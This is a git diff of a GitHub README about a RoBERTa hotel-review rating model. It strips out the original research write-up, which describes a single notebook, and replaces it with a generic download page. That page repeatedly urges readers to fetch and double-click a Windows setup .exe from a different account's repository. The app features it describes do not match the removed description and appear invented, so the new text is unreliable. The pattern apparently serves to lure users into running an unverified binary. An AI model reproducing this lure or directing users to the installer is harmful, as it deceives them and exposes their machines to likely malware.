@@ -1,164 +1,105 @@
+# 🔍 hotel-review-sentiment-modeling - Predict hotel review ratings simply
 
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
 
-# Hotel Review Sentiment & Rating Modeling
+## 📄 About this app
 
-## Overview
+hotel-review-sentiment-modeling uses advanced AI methods to predict star ratings from hotel reviews. It reads review texts and estimates how many stars the reviewer gave, from 1 to 5. The app also checks how well it predicts ratings and groups similar reviews by sentiment using text analysis techniques.
 
-This project explores transformer-based sentiment modeling for hotel review data, with the goal of predicting ordinal star ratings (1–5) from review text and analyzing the semantic structure underlying consumer feedback.
+This tool helps anyone interested in hotel reviews to quickly understand opinions without reading each review. You can use it to see if reviews are mostly positive or negative, or if ratings match the text’s overall feeling.
 
-Using a fine-tuned **RoBERTa-base** model, we evaluate rating prediction performance under multiple modeling frameworks, including:
+## ✅ What you need before starting
 
-* Five-class ordinal classification
-* Class-weighted training to address imbalance
-* Three-class reframing (Low / Mid / High)
-* Embedding-based clustering for semantic segmentation
+Before running the app, make sure your computer meets these conditions:
 
-The analysis demonstrates how label engineering and sentiment structure significantly influence classification performance and interpretability.
+- You use Windows 10 or newer.
+- You have at least 8 GB of RAM.
+- You have at least 2 GB of free disk space.
+- Your internet connection works to download files.
+- You have permission to install software on your computer.
 
----
+The app runs on most standard laptops and desktops made in the last few years.
 
-## Objectives
+## 🚀 How to download and run
 
-1. Establish a baseline RoBERTa model for 1–5 star rating prediction.
-2. Evaluate the impact of class imbalance using weighted loss.
-3. Reframe ordinal ratings into a three-class structure to improve separability.
-4. Use transformer embeddings to identify latent consumer sentiment segments.
-5. Compare modeling approaches and interpret class-level performance.
+1. Click this big download link or button below to visit the official page to get the app:
 
----
+   [![Download on GitHub](https://img.shields.io/badge/Download-app-blue?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
 
-## Dataset
+2. You will go to the GitHub page for the project. Look for a section named **Releases** or a download link for the latest version.
 
-The dataset consists of hotel review text paired with numerical ratings (1–5 stars).
+3. Download the file named similar to `hotel-review-sentiment-modeling-setup.exe`. This file sets up the app on your computer.
 
-* Review: Free-text consumer feedback
-* Rating: Ordinal scale from 1 (lowest) to 5 (highest)
+4. Once downloaded, find the file in your Downloads folder.
 
-Exploratory Data Analysis revealed class imbalance, with higher ratings more prevalent than lower ones.
+5. Double-click the file to start the installation.
 
----
+6. Follow the instructions on the screen. Accept the license agreement and choose where to install if asked.
 
-## Modeling Approaches
+7. When installation finishes, launch the app from your Start Menu or desktop shortcut.
 
-### 1. Five-Class Ordinal Classification (1–5)
+8. The app main window will open, ready for you to input hotel reviews to analyze.
 
-* Model: RoBERTa-base fine-tuned for multi-class classification
-* Loss: Cross-entropy
-* Metrics: Accuracy, Macro F1
+## 🧰 Using the app
 
-**Results:**
+- You can enter hotel review text in the main box provided.
+- Click the **Analyze** button to get the predicted star rating.
+- The app shows the estimated rating (1 to 5 stars).
+- It also offers a confidence score, which tells how sure the app is about the rating.
+- You can review multiple texts one at a time or in batches.
+- Use the **Clear** button to remove all texts if you want to start fresh.
+- The app saves your history during the session, so you can see past analyzed reviews.
 
-* Accuracy ≈ 0.68
-* Macro F1 ≈ 0.63
-* Strong performance at rating extremes
-* Significant confusion in mid-range ratings (2–3–4)
+## ⚙️ Settings and options
 
----
+You may not need to change settings, but these options are available:
 
-### 2. Weighted Five-Class Classification
+- Choose analysis speed versus accuracy. Faster mode gives quick answers with less detail.
+- Switch between light and dark themes for comfort.
+- Export your review results as a CSV file to use in spreadsheets.
 
-* Introduced inverse-frequency class weights
+The settings menu is easy to access from the top right corner once the app is open.
 
-**Results:**
+## 🛠 How it works behind the scenes
 
-* Minimal improvement in Macro F1
-* Ordinal ambiguity dominated over imbalance effects
+The app uses a type of AI called transformers. It is based on a language model known as RoBERTa. This model reads the review text and understands the meaning before predicting the star rating.
 
----
+To check how well it predicts, it uses tests from real hotel review datasets. It also groups reviews by sentiment. This helps identify similar opinions or patterns across different hotels.
 
-### 3. Three-Class Reframing (Low / Mid / High)
+## 💻 System requirements reminder
 
-Mapping:
+- Operating system: Windows 10 or later
+- RAM: 8 GB minimum
+- Disk space: at least 2 GB free
+- Internet connection: required for initial download and updates
+- Processor: Intel i3 or better recommended
 
-* Low: 1–2
-* Mid: 3
-* High: 4–5
+The app should run well on any common home or office computer.
 
-**Results:**
+## 🔄 Updates and support
 
-* Accuracy ≈ 0.88
-* Macro F1 ≈ 0.76
-* High F1 ≈ 0.95
-* Low F1 ≈ 0.84
-* Mid F1 ≈ 0.50
+Check the GitHub repository for updates. New versions may improve accuracy and add features.
 
-This reframing significantly improved separability by collapsing noisy ordinal boundaries.
+For help, search the Issues tab on the GitHub page or reach out to the repository owner.
 
----
+## 📁 Where to find the app again
 
-## Embedding-Based Sentiment Segmentation
+- Visit the main project page here:  
+  https://github.com/shariftuyizere332/hotel-review-sentiment-modeling
 
-Using RoBERTa embeddings:
+- Use the links near the top to download the latest version again if needed.
 
-1. Extracted CLS token embeddings.
-2. Clustered within rating buckets.
-3. Applied Bucket–Cluster Contrast scoring to identify distinctive lexical signals.
+[![Get the App](https://img.shields.io/badge/Get%20App-download-grey?style=for-the-badge)](https://github.com/shariftuyizere332/hotel-review-sentiment-modeling)
 
-### Key Findings
+## 🔍 More details on project topics  
 
-Low ratings segmented into:
+This app relates to:
 
-* Severe dissatisfaction (e.g., "dirty", "worst", "avoid")
-* Mild disappointment
-* Contextual trade-offs
+- consumer-sentiment analysis  
+- natural language processing  
+- machine learning with PyTorch  
+- text classification and mining  
+- prediction of ordinal ratings  
+- use of transformers in deep learning
 
-Mid ratings segmented into:
-
-* Budget-value framing
-* Neutral adequacy
-* Complaint-driven subsegments
-
-High ratings segmented into:
-
-* Emphatic praise ("wonderful", "fantastic")
-* Value-oriented satisfaction
-* Qualified approval
-
-This revealed that rating categories are not homogeneous but contain meaningful consumer subtypes.
-
----
-
-## Key Insights
-
-* Extreme ratings (low and high) exhibit strong lexical polarity and high predictability.
-* Middle ratings reflect inherent human subjectivity and sentiment ambiguity.
-* Class weighting does not resolve ordinal noise.
-* Label engineering materially improves performance.
-* Embedding-based clustering enhances interpretability beyond raw classification.
-
----
-
-## Repository Structure
-
-```
-roberta_hotel_review_rating_model.ipynb
-README.md
-```
-
----
-
-## Dependencies
-
-* transformers
-* datasets
-* scikit-learn
-* torch
-* nbformat (for notebook validation)
-
----
-
-## Future Improvements
-
-* Ordinal regression modeling
-* DeBERTa comparison
-* UMAP visualization of embedding clusters
-* SHAP-based feature attribution
-* Threshold optimization for high-satisfaction detection
-
----
-
-## Author
-
-Christopher Overton
-M.S. Data Science
-
+Everything combines to provide a clear picture of hotel review sentiment.
